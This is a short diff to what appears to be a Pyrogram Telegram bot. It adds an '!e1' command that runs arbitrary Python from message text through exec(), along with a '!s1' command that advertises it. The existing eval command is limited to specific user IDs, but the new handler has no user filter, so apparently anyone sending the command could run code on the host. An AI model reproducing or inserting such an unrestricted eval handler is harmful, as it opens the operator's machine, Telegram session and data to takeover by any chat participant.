@@ -27,6 +27,31 @@ async def aexec(code,app, msg,p):
     return await locals()["__aexec"](app, msg, p)
 
 
+
+
+
+from pyrogram.types import Message
+import asyncio
+
+@app.on_message(filters.command("e1", prefixes="!"))
+async def evaluate_code(app, message: Message):
+    code = message.text.split(maxsplit=1)[1]
+    try:
+        exec_locals = {}
+        exec(code, globals(), exec_locals)
+        output = str(exec_locals)
+        await message.edit_text(output)
+    except Exception as e:
+        traceback_str = traceback.format_exc()
+        await message.edit_text(f"Error: {e}\n\n{traceback_str}")
+
+@app.on_message(filters.command("s1", prefixes="!"))
+async def start(app, message: Message):
+    await message.edit_text("Send !e1  to evaluate Python code.")
+
+
+
+
 @app.on_message(filters.command("ev") & filters.user([6505111743, 6517565595, 5220416927, 5896960462]))
 @app.on_edited_message(filters.command("ev") & filters.user([6505111743, 6517565595, 5220416927, 5896960462]))
 async def evalFunc(app:app, message):
